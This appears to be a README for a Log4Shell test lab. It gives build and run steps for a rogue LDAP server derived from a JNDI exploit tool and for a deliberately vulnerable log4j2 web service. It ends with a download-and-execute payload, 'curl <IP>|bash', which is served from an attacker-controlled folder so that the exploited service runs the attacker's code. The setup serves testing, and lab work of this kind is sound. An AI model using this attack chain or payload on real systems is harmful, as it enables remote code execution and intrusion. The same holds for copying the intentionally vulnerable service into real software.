## RogueLDAP

------------

This is a lightweight ```RogueLDAP``` server which is a modified version of the  [JNDIExploit-1](https://github.com/gysf666/JNDIExploit-1). Before running the Rogue LDAP Server, we should build and run the vulnerable ```loggin-log4j2``` application

### Build and run with Maven

In order to build the ```RogueLDAP``` server we will run the following commands 

```
cd RogueLDAP
mvn clean package
cd target
java -jar RogueLDAP-1.4-SNAPSHOT.jar
```

## logging-log4j2

------------

The ```logging-log4j2``` is a vulnerable dummy web service which only logs a user supplied string value. This application created for testing purposes in order to test the Log4Shell vulnerability using the ```RogueLDAP``` server previously described.  

### Build and run with Docker

From cli run the following command to build and run the ```logging-log4j2``` application 

```
cd logging-log4j2
mvn clean install
docker build -f Dockerfile -t logging-log4j2-vuln .
docker run -p 8080:8080 logging-log4j2-vuln 
```

## Setup the Environment

The setup should be as follows 

1. run the ```RogueLDAP``` server 
2. run the vulnerable ```logging-log4j2``` application 
2. create a folder called shells at a preffered location

```
mkdir shells 
cd shells 
```

There create an ```index.html``` file 

```
touch index.html 
```

Inside the ```index.html``` file put the following payload and change the IP address with the one that suit to the current environment

```
curl 192.168.1.6|bash 

``` 